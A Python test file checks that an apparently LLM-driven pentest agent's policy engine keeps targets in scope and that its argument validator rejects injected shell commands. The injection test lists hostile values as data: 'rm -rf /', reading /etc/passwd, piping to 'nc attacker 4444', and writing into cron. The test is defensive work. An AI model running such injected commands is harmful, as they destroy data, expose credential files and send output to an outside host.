"""Security regression tests: policy / scope bypass scenarios.

These are the highest-value tests for an offensive-tooling agent: they lock in
the guarantee that an LLM- or operator-supplied target cannot escape the
authorized scope, that excluded targets always win, that shell metacharacters
never reach the executor, and that a denied dangerous-tool approval cannot crash
the agent loop (the bug that previously hung the whole suite).
"""

import pytest

from quarr.core.exceptions import ArgumentValidationError, PolicyViolationError
from quarr.core.models import Engagement, RiskLevel
from quarr.core.policy import PolicyEngine
from quarr.core.validators.command import validate_argv

# --------------------------------------------------------------------------- #
# Scope escape via target normalization
# --------------------------------------------------------------------------- #

@pytest.mark.unit
@pytest.mark.parametrize("target", [
    "10.10.11.5",              # adjacent /24, outside 10.10.10.0/24
    "evillab.local",           # looks like the wildcard but is not a subdomain
    "notlab.local",
    "lab.local.evil.com",      # scope string appears but as a prefix
    "192.168.1.1",
])
def test_out_of_scope_targets_denied(target):
    eng = Engagement(
        name="T", allowed_targets=["10.10.10.0/24", "*.lab.local"],
        allowed_operations=[],
    )
    with pytest.raises(PolicyViolationError):
        PolicyEngine.authorize("network_discovery", {"target": target}, eng)


@pytest.mark.unit
@pytest.mark.parametrize("target", [
    "10.10.10.5",
    "app.lab.local",
    "http://app.lab.local/some/path?q=1",   # URL trimmed to host
    "app.lab.local:8443",                   # port stripped
])
def test_in_scope_targets_allowed(target):
    eng = Engagement(
        name="T", allowed_targets=["10.10.10.0/24", "*.lab.local"],
        allowed_operations=[],
    )
    assert PolicyEngine.authorize("network_discovery", {"target": target}, eng)


# --------------------------------------------------------------------------- #
# Case-based bypass (DNS is case-insensitive)
# --------------------------------------------------------------------------- #

@pytest.mark.unit
@pytest.mark.parametrize("target", ["PROD.LAB.LOCAL", "Prod.Lab.Local", "prod.lab.local"])
def test_excluded_target_case_insensitive(target):
    """Excluded target must be rejected regardless of letter case."""
    eng = Engagement(
        name="T", allowed_targets=["*.lab.local"],
        excluded_targets=["prod.lab.local"], allowed_operations=[],
    )
    with pytest.raises(PolicyViolationError) as ei:
        PolicyEngine.authorize("network_discovery", {"target": target}, eng)
    assert "excluded" in str(ei.value).lower()


@pytest.mark.unit
@pytest.mark.parametrize("target", ["APP.LAB.LOCAL", "App.Lab.Local"])
def test_in_scope_case_insensitive(target):
    eng = Engagement(name="T", allowed_targets=["app.lab.local"], allowed_operations=[])
    assert PolicyEngine.authorize("network_discovery", {"target": target}, eng)


# --------------------------------------------------------------------------- #
# Excluded takes precedence over an otherwise-allowed scope
# --------------------------------------------------------------------------- #

@pytest.mark.unit
def test_excluded_overrides_allowed():
    eng = Engagement(
        name="T", allowed_targets=["10.10.10.0/24"],
        excluded_targets=["10.10.10.5"], allowed_operations=[],
    )
    with pytest.raises(PolicyViolationError) as ei:
        PolicyEngine.authorize("network_discovery", {"target": "10.10.10.5"}, eng)
    assert "excluded" in str(ei.value).lower()


# --------------------------------------------------------------------------- #
# URL userinfo spoofing: "http://in-scope@evil.com" must resolve to evil.com
# --------------------------------------------------------------------------- #

@pytest.mark.unit
def test_userinfo_spoof_does_not_grant_scope():
    assert PolicyEngine.normalize_target("http://app.lab.local@evil.com") == "evil.com"
    eng = Engagement(name="T", allowed_targets=["app.lab.local"], allowed_operations=[])
    with pytest.raises(PolicyViolationError):
        PolicyEngine.authorize("network_discovery",
                               {"target": "http://app.lab.local@evil.com"}, eng)


# --------------------------------------------------------------------------- #
# Operation allowlist
# --------------------------------------------------------------------------- #

@pytest.mark.unit
def test_tool_not_in_allowed_operations_denied():
    eng = Engagement(
        name="T", allowed_targets=["10.10.10.0/24"],
        allowed_operations=["network_discovery"],
    )
    with pytest.raises(PolicyViolationError) as ei:
        PolicyEngine.authorize("sqli_scan", {"target": "10.10.10.5"}, eng)
    assert "allowed operations" in str(ei.value).lower()


# --------------------------------------------------------------------------- #
# Command injection cannot reach the executor
# --------------------------------------------------------------------------- #

@pytest.mark.unit
@pytest.mark.parametrize("bad", [
    ["nmap", "10.10.10.5; rm -rf /"],
    ["nmap", "10.10.10.5 && cat /etc/passwd"],
    ["nmap", "$(reboot)"],
    ["nmap", "`id`"],
    ["nmap", "10.10.10.5|nc attacker 4444"],
    ["nmap", "10.10.10.5\nmalicious"],
    ["nmap", "-oN", "/tmp/x > /etc/cron.d/evil"],
])
def test_command_injection_blocked(bad):
    with pytest.raises(ArgumentValidationError):
        validate_argv(bad)


@pytest.mark.unit
def test_clean_argv_allowed():
    assert validate_argv(["nmap", "-sV", "-p", "80,443", "10.10.10.5"])


# --------------------------------------------------------------------------- #
# Role vs risk (privilege escalation) and approval gate
# --------------------------------------------------------------------------- #

@pytest.mark.unit
def test_viewer_cannot_run_critical_tool():
    eng = Engagement(name="T", allowed_targets=["10.10.10.0/24"], allowed_operations=[])
    with pytest.raises(PolicyViolationError):
        PolicyEngine.authorize(
            "hash_crack", {"target": "10.10.10.5"}, eng,
            role="viewer", tool_risk=RiskLevel.CRITICAL,
        )


@pytest.mark.unit
def test_operator_cannot_run_critical_tool():
    eng = Engagement(name="T", allowed_targets=["10.10.10.0/24"], allowed_operations=[])
    with pytest.raises(PolicyViolationError):
        PolicyEngine.authorize(
            "hash_crack", {"target": "10.10.10.5"}, eng,
            role="operator", tool_risk=RiskLevel.CRITICAL,
        )


# --------------------------------------------------------------------------- #
# Regression: a denied approval must not crash the policy-violation log path.
# Previously `logger.warning("policy_violation", tool=..., **e.context)` raised
# TypeError because e.context already carried a "tool" key, which broke the
# WebSocket flow and hung the test suite.
# --------------------------------------------------------------------------- #

@pytest.mark.unit
def test_policy_violation_context_with_tool_key_is_logged_cleanly():
    from quarr.core.logging import get_logger
    logger = get_logger("quarr.test.policy")
    # Simulate the exact collision: an exception whose context contains "tool".
    err = PolicyViolationError("denied by operator",
                               context={"tool": "hash_crack", "decision": "denied"})
    # This mirrors the merge used in agent.run(); it must not raise TypeError.
    log_fields = {"tool": "hash_crack", "message": str(err), **err.context}
    logger.warning("policy_violation", **log_fields)  # no exception == pass
